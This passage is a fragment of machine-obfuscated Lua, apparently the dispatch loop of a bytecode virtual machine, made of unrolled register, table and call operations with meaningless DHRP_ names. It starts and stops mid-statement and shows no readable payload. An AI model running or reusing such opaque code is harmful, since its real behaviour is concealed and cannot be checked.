local DHRP_f;local DHRP_e;DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_e=DHRP_a[2];DHRP_f=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_e+1]=DHRP_f;DHRP_c[DHRP_e]=DHRP_f[DHRP_a[4]];end;elseif DHRP_f<=8 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_c[DHRP_a[4]]];elseif DHRP_f>9 then local DHRP_b=DHRP_a[2];local DHRP_d=DHRP_c[DHRP_b];for DHRP_a=DHRP_b+1,DHRP_a[3]do DHRP_m(DHRP_d,DHRP_c[DHRP_a])end;else local DHRP_b=DHRP_a[2]DHRP_c[DHRP_b]=DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3]))end;elseif DHRP_f<=16 then if DHRP_f<=13 then if DHRP_f<=11 then local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];elseif DHRP_f==12 then DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];else if(DHRP_c[DHRP_a[2]]~=DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;end;elseif DHRP_f<=14 then DHRP_e[DHRP_a[3]]=DHRP_c[DHRP_a[2]];elseif DHRP_f==15 then do return end;else local DHRP_f;DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];end;elseif DHRP_f<=19 then if DHRP_f<=17 then DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];elseif DHRP_f==18 then local DHRP_f;local DHRP_e;DHRP_e=DHRP_a[2]DHRP_c[DHRP_e]=DHRP_c[DHRP_e](DHRP_g(DHRP_c,DHRP_e+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_e=DHRP_a[2];DHRP_f=DHRP_c[DHRP_e];for DHRP_a=DHRP_e+1,DHRP_a[3]do DHRP_m(DHRP_f,DHRP_c[DHRP_a])end;else DHRP_e[DHRP_a[3]]=DHRP_c[DHRP_a[2]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];for DHRP_a=DHRP_a[2],DHRP_a[3]do DHRP_c[DHRP_a]=nil;end;DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_b=DHRP_a[3];end;elseif DHRP_f<=20 then local DHRP_d=DHRP_a[3];local DHRP_b=DHRP_c[DHRP_d]for DHRP_a=DHRP_d+1,DHRP_a[4]do DHRP_b=DHRP_b..DHRP_c[DHRP_a];end;DHRP_c[DHRP_a[2]]=DHRP_b;elseif DHRP_f>21 then DHRP_b=DHRP_a[3];else DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];end;elseif DHRP_f<=34 then if DHRP_f<=28 then if DHRP_f<=25 then if DHRP_f<=23 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];elseif DHRP_f>24 then if DHRP_c[DHRP_a[2]]then 